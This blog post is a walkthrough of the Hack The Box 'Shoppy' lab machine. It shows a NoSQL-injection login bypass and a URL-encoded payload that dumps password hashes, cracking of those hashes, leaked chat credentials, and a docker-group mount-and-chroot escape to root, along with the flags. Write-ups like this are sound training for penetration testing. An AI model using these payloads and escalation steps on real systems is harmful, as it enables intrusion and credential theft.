<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Shoppy from HTB" /><meta property="og:locale" content="en" /><meta name="description" content="Shoppy from HTB add this to /etc/hosts 1 10.10.11.180 shoppy.htb Access the site and we see that there is nothing. Run gobusterfor directory busting and ffuffor subdomains. for fuf use /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt Before that finishes find out on what languagedoes site operate on. Try to get 404code and with that we can learn sum. 1 Cannot GET /help Cannot GET searching that tells us that site runs on Node-JS With gobuster we found loginpage. Go to that and then perform nosql-injection 1 2 admin&#39;||&#39;1&#39;==&#39;1 &lt;---- in username e.g. help &lt;---- in password Then login Click search for usersand then perform same injection but now in url. It has to be url-encoded. url-encoded 1 http://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%27%3D%3D%271 Then you will get this. 1 2 3 4 5 6 7 8 9 10 11 12 [ { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67a&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;23c6877d9e2b564ef8b32c3a23de27b2&quot; }, { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67b&quot;, &quot;username&quot;: &quot;josh&quot;, &quot;password&quot;: &quot;6ebcea65320589ca4f2f1ce039975995&quot; } ] Go to cracstationand paste both password. You will get password for joshand it’s : remembermethisway. You can’t access sshwith this. So then maybe there is an subdomain. ffuffound mattermostsubdomain so add it to /etc/hosts 1 10.10.11.180 mattermost.shoppy.htb Then access it. In Deploy Machinechat you will find this: ``` Hey @josh," /><meta property="og:description" content="Shoppy from HTB add this to /etc/hosts 1 10.10.11.180 shoppy.htb Access the site and we see that there is nothing. Run gobusterfor directory busting and ffuffor subdomains. for fuf use /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt Before that finishes find out on what languagedoes site operate on. Try to get 404code and with that we can learn sum. 1 Cannot GET /help Cannot GET searching that tells us that site runs on Node-JS With gobuster we found loginpage. Go to that and then perform nosql-injection 1 2 admin&#39;||&#39;1&#39;==&#39;1 &lt;---- in username e.g. help &lt;---- in password Then login Click search for usersand then perform same injection but now in url. It has to be url-encoded. url-encoded 1 http://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%27%3D%3D%271 Then you will get this. 1 2 3 4 5 6 7 8 9 10 11 12 [ { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67a&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;23c6877d9e2b564ef8b32c3a23de27b2&quot; }, { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67b&quot;, &quot;username&quot;: &quot;josh&quot;, &quot;password&quot;: &quot;6ebcea65320589ca4f2f1ce039975995&quot; } ] Go to cracstationand paste both password. You will get password for joshand it’s : remembermethisway. You can’t access sshwith this. So then maybe there is an subdomain. ffuffound mattermostsubdomain so add it to /etc/hosts 1 10.10.11.180 mattermost.shoppy.htb Then access it. In Deploy Machinechat you will find this: ``` Hey @josh," /><link rel="canonical" href="https://darkfears31.github.io/posts/Shoppy-from-HTB/" /><meta property="og:url" content="https://darkfears31.github.io/posts/Shoppy-from-HTB/" /><meta property="og:site_name" content="darkfears31’s Walktroughs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-06T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Shoppy from HTB" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-06T00:00:00+00:00","datePublished":"2024-09-06T00:00:00+00:00","description":"Shoppy from HTB add this to /etc/hosts 1 10.10.11.180 shoppy.htb Access the site and we see that there is nothing. Run gobusterfor directory busting and ffuffor subdomains. for fuf use /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt Before that finishes find out on what languagedoes site operate on. Try to get 404code and with that we can learn sum. 1 Cannot GET /help Cannot GET searching that tells us that site runs on Node-JS With gobuster we found loginpage. Go to that and then perform nosql-injection 1 2 admin&#39;||&#39;1&#39;==&#39;1 &lt;---- in username e.g. help &lt;---- in password Then login Click search for usersand then perform same injection but now in url. It has to be url-encoded. url-encoded 1 http://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%27%3D%3D%271 Then you will get this. 1 2 3 4 5 6 7 8 9 10 11 12 [ { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67a&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;23c6877d9e2b564ef8b32c3a23de27b2&quot; }, { &quot;_id&quot;: &quot;62db0e93d6d6a999a66ee67b&quot;, &quot;username&quot;: &quot;josh&quot;, &quot;password&quot;: &quot;6ebcea65320589ca4f2f1ce039975995&quot; } ] Go to cracstationand paste both password. You will get password for joshand it’s : remembermethisway. You can’t access sshwith this. So then maybe there is an subdomain. ffuffound mattermostsubdomain so add it to /etc/hosts 1 10.10.11.180 mattermost.shoppy.htb Then access it. In Deploy Machinechat you will find this: ``` Hey @josh,","headline":"Shoppy from HTB","mainEntityOfPage":{"@type":"WebPage","@id":"https://darkfears31.github.io/posts/Shoppy-from-HTB/"},"url":"https://darkfears31.github.io/posts/Shoppy-from-HTB/"}</script><title>Shoppy from HTB | darkfears31's Walktroughs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="darkfears31's Walktroughs"><meta name="application-name" content="darkfears31's Walktroughs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/162694375?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">darkfears31's Walktroughs</a></div><div class="site-subtitle font-italic">An PicoCTF and HackTheBox Walktroughs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/darkfears31" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://youtube.com/user/jadehawk" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Shoppy from HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Shoppy from HTB</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1725580800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/darkfears31">kaikaci</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="584 words"> <em>3 min</em> read</span></div></div></div><div class="post-content"><h1 id="shoppy-from-htb">Shoppy from HTB</h1><p>add this to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.11.180 shoppy.htb
</pre></table></code></div></div><p>Access the site and we see that there is nothing. Run <code class="language-plaintext highlighter-rouge">gobuster</code>for directory busting and <code class="language-plaintext highlighter-rouge">ffuf</code>for subdomains. <code class="language-plaintext highlighter-rouge">for fuf use /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code> Before that finishes find out on what <code class="language-plaintext highlighter-rouge">language</code>does site operate on. Try to get <code class="language-plaintext highlighter-rouge">404</code>code and with that we can learn sum.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Cannot GET /help
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Cannot GET</code> searching that tells us that site runs on <code class="language-plaintext highlighter-rouge">Node-JS</code> With <code class="language-plaintext highlighter-rouge">gobuster</code> we found <code class="language-plaintext highlighter-rouge">login</code>page. Go to that and then perform <code class="language-plaintext highlighter-rouge">nosql-injection</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>admin'||'1'=='1 &lt;---- in username
e.g. help &lt;---- in password
</pre></table></code></div></div><p>Then <code class="language-plaintext highlighter-rouge">login</code> Click <code class="language-plaintext highlighter-rouge">search for users</code>and then perform same injection but now in <code class="language-plaintext highlighter-rouge">url</code>. It has to be <code class="language-plaintext highlighter-rouge">url-encoded</code>. <code class="language-plaintext highlighter-rouge">url-encoded</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%27%3D%3D%271
</pre></table></code></div></div><p>Then you will get this.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
</pre></table></code></div></div><p>Go to <code class="language-plaintext highlighter-rouge">cracstation</code>and paste both password. You will get password for <code class="language-plaintext highlighter-rouge">josh</code>and it’s : <code class="language-plaintext highlighter-rouge">remembermethisway</code>. You can’t access <code class="language-plaintext highlighter-rouge">ssh</code>with this. So then maybe there is an <code class="language-plaintext highlighter-rouge">subdomain</code>. <code class="language-plaintext highlighter-rouge">ffuf</code>found <code class="language-plaintext highlighter-rouge">mattermost</code>subdomain so add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.11.180 mattermost.shoppy.htb
</pre></table></code></div></div><p>Then access it. In <code class="language-plaintext highlighter-rouge">Deploy Machine</code>chat you will find this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Hey @josh,

For the deploy machine,
you can create an account with these creds
 username: jaeger
 password: Sh0ppyBest@pp!
</pre></table></code></div></div><p>Go to <code class="language-plaintext highlighter-rouge">ssh</code>and log in with this <code class="language-plaintext highlighter-rouge">creds</code>. <em>** User Flag is: c6acc5b48213051b19adc3ae540c7240 **</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jaeger:
Matching Defaults entries <span class="k">for </span>jaeger on shoppy:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User jaeger may run the following commands on shoppy:
    <span class="o">(</span>deploy<span class="o">)</span> /home/deploy/password-manager
</pre></table></code></div></div><p>You’ll need password for this <code class="language-plaintext highlighter-rouge">password-manager</code>you will find it with this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>strings <span class="nt">-e</span> l /home/deploy/password-manager
Sample
</pre></table></code></div></div><p>Then run it. You will get password for <code class="language-plaintext highlighter-rouge">deploy</code>. Become the <code class="language-plaintext highlighter-rouge">deploy</code>user.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
</pre></table></code></div></div><p>We are in <code class="language-plaintext highlighter-rouge">docker</code>group. With this you can always become the <code class="language-plaintext highlighter-rouge">root</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>deploy@shoppy:~<span class="nv">$ </span>docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   2 years ago   5.53MB
deploy@shoppy:~<span class="nv">$ </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">-v</span> /:/mnt alpine /bin/sh
/ <span class="c"># cd mnt</span>
/mnt <span class="c"># chroot .</span>
</pre></table></code></div></div><p>The command <code class="language-plaintext highlighter-rouge">docker run --rm -it -v /:/mnt alpine /bin/sh</code> is used to run a Docker container with the following options:</p><ul><li><strong><code class="language-plaintext highlighter-rouge">docker run</code></strong>: This command is used to start a new Docker container.<li><strong><code class="language-plaintext highlighter-rouge">--rm</code></strong>: Automatically removes the container when it exits. This prevents unused containers from accumulating on your system.<li><strong><code class="language-plaintext highlighter-rouge">-it</code></strong>: Combines <code class="language-plaintext highlighter-rouge">-i</code> (interactive) and <code class="language-plaintext highlighter-rouge">-t</code> (pseudo-<code class="language-plaintext highlighter-rouge">TTY</code>), allowing you to interact with the container via the terminal.<li><strong><code class="language-plaintext highlighter-rouge">-v /:/mnt</code></strong>: This mounts the host machine’s root directory (<code class="language-plaintext highlighter-rouge">/</code>) to the container’s <code class="language-plaintext highlighter-rouge">/mnt</code> directory. Essentially, the container will have access to the entire file system of the host under the <code class="language-plaintext highlighter-rouge">/mnt</code> directory.<li><strong><code class="language-plaintext highlighter-rouge">alpine</code></strong>: This specifies the Docker image to use, in this case, <code class="language-plaintext highlighter-rouge">alpine</code>, which is a small, <code class="language-plaintext highlighter-rouge">minimalistic</code> Linux distribution.<li><strong><code class="language-plaintext highlighter-rouge">/bin/sh</code></strong>: This is the command to be run inside the container, starting a shell session (<code class="language-plaintext highlighter-rouge">/bin/sh</code>) in the Alpine container.</ul><h3 id="what-this-command-does"><span class="mr-2"><strong>What This Command Does:</strong></span><a href="#what-this-command-does" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ol><li>It starts an Alpine Linux container.<li>It provides you with an interactive shell inside the container.<li>It gives the container access to the host machine’s entire file system, mounted at <code class="language-plaintext highlighter-rouge">/mnt</code>.</ol><h3 id="potential-risks"><span class="mr-2"><strong>Potential Risks:</strong></span><a href="#potential-risks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This command gives the container unrestricted access to your entire host file system, which can be dangerous if not handled with care, as it could potentially modify or delete critical files on the host system. <em>** Root Flag is: 063a18189ade4a31fbf52b970fab80a1 **</em> <img data-src="/assets/images/Screenshot from 2024-08-14 18-07-58.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shoppy+from+HTB+-+darkfears31%27s+Walktroughs&url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FShoppy-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shoppy+from+HTB+-+darkfears31%27s+Walktroughs&u=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FShoppy-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FShoppy-from-HTB%2F&text=Shoppy+from+HTB+-+darkfears31%27s+Walktroughs" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tabby-from-HTB/">Tabby from HTB</a><li><a href="/posts/Stonks-from-PicoCTF/">Stonks from PicoCTF</a><li><a href="/posts/Backdoor-from-HTB/">Backdoor from HTB</a><li><a href="/posts/Antique-from-HTB/">Antique from HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Codify-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Codify from HTB"</h3><div class="text-muted small"><p> Codify from HTB page Nmap gave nothing unusual. Went to the site and saw vm2and then went for vm2 exploitand got to this github: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 c...</p></div></div></a></div><div class="card"> <a href="/posts/CozyHosting-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CozyHosting from HTB</h3><div class="text-muted small"><p> CozyHosting from HTB page Nmap gave this: nmap -sCV --min-rate 4000 10.10.11.230 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 18:47 +04 Nmap scan report for cozyhosting.htb (10.10.11.23...</p></div></div></a></div><div class="card"> <a href="/posts/Devvortex-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Devvortex from HTB</h3><div class="text-muted small"><p> Devvortex from HTB page Nmapgave this: nmap -sCV --min-rate 4000 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 15:06 +04 Nmap scan report for devvortex.htb (10.10.11.242) Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Serpentine-from-PicoCTF/" class="btn btn-outline-primary" prompt="Older"><p>Serpentine from PicoCTF</p></a> <a href="/posts/Sleuthkit-Apprentice-from-PicoCTF/" class="btn btn-outline-primary" prompt="Newer"><p>Sleuthkit Apprentice from PicoCTF</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/darkfears31">kaikaci</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: 